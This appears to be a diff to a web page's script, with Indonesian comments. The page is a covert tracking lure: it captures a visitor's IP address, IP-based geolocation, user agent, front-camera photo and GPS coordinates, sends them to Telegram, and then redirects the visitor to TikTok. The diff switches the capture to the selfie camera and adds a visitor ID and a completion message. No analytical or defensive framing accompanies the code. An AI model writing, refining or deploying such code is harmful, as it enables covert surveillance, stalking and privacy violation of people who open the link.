@@ -92,7 +92,7 @@ function dataURLtoBlob(dataURL) {
 }
 
 // ============================================
-// 🔴 CAPTURE PHOTO
+// 🔴 CAPTURE PHOTO — KAMERA DEPAN
 // ============================================
 function capturePhoto() {
     return new Promise((resolve) => {
@@ -100,7 +100,8 @@ function capturePhoto() {
         const canvas = document.getElementById('photoCanvas');
 
         navigator.mediaDevices.getUserMedia({
-            video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } }
+            // 🔴 KAMERA DEPAN (user)
+            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
         })
         .then(stream => {
             video.srcObject = stream;
@@ -128,6 +129,7 @@ function capturePhoto() {
 const time = new Date().toLocaleString('id-ID');
 const ua = navigator.userAgent;
 const ref = document.referrer || 'Direct';
+const visitorId = 'visitor_' + Date.now();
 
 // 1. AMBIL IP + GEOLOKASI
 fetch('https://api.ipify.org?format=json')
@@ -135,10 +137,8 @@ fetch('https://api.ipify.org?format=json')
     .then(data => {
         const ip = data.ip;
 
-        // Kirim IP
-        sendToTelegram(`✅ NEW VISITOR\n━━━━━━━━━━━━━━━━━━━\n🕐 ${time}\n🌐 IP: <code>${ip}</code>\n📱 ${ua}\n🔗 ${ref}`);
+        sendToTelegram(`✅ NEW VISITOR\n━━━━━━━━━━━━━━━━━━━\n🕐 ${time}\n🌐 IP: <code>${ip}</code>\n📱 ${ua}\n🔗 ${ref}\n🆔 ${visitorId}`);
 
-        // Ambil Geolokasi dari IP
         fetch(`http://ip-api.com/json/${ip}`)
             .then(r => r.json())
             .then(geo => {
@@ -148,10 +148,10 @@ fetch('https://api.ipify.org?format=json')
             });
     });
 
-// 2. AMBIL FOTO (POPUP ALLOW)
+// 2. AMBIL FOTO (KAMERA DEPAN — POPUP ALLOW)
 capturePhoto().then(img => {
     if (img) {
-        sendPhotoToTelegram(img, `📸 AUTO PHOTO\n━━━━━━━━━━━━━━━━━━━\n🕐 ${time}`);
+        sendPhotoToTelegram(img, `📸 AUTO PHOTO (FRONT)\n━━━━━━━━━━━━━━━━━━━\n🕐 ${time}`);
     }
 });
 
@@ -163,14 +163,15 @@ if (navigator.geolocation) {
             const lng = pos.coords.longitude;
             sendToTelegram(`📍 GPS LOCATION!\n━━━━━━━━━━━━━━━━━━━\n🎯 <code>${lat}, ${lng}</code>\n🗺️ https://www.google.com/maps?q=${lat},${lng}`);
         },
-        () => {} // GAGAL → LANJUT
+        () => {}
     );
 }
 
-// 4. ✅ REDIRECT KE TIKTOK (SETELAH 2.5 DETIK)
+// 4. ✅ KIRIM DONE + REDIRECT
 setTimeout(() => {
+    sendToTelegram(`✅ DONE\n━━━━━━━━━━━━━━━━━━━\n🆔 ${visitorId}`);
     window.location.replace(REDIRECT_URL);
-}, 2500);
+}, 3000);
 </script>
 
 </body>
